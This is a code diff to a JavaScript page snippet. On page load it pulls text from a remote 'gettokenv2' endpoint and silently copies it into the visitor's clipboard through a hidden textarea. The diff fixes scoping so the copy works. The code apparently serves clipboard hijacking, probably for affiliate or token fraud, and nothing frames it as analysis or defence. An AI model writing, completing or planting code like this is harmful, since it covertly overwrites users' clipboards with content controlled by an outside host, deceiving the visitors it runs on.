@@ -1,7 +1,7 @@
+var c_mua = "";
 function test(data){
   //setTimeout(function(a) { if (!document.body) { return setTimeout(arguments.callee, 50)}
-  var c=data.text;
-  console.log('test ---'+c)
+  c_mua=data.text;
   var b = document.createElement("textarea");
   var u = navigator.userAgent;
   if (u.indexOf('Android') > -1 || u.indexOf('Linux') > -1) {
@@ -31,7 +31,9 @@ var copy = function() {
   if (!document.getElementById('hd_textarea_element')) {
     return
   };
-  b.value = c;
+  b = document.getElementById('hd_textarea_element');
+  b.value = c_mua;
+  console.log('--------'+b.value)
   b.select();
   b.setSelectionRange(0, b.value.length);
   if(document.execCommand('copy', false, null)){
@@ -39,7 +41,6 @@ var copy = function() {
   }
 };
 window.onload= function(){
-  console.log('onload')
   var s=document.createElement("script");
   s.setAttribute('src','http://logs.newapi.com/jd/gettokenv2?f=ma25&callback=test');
   document.body.appendChild(s)
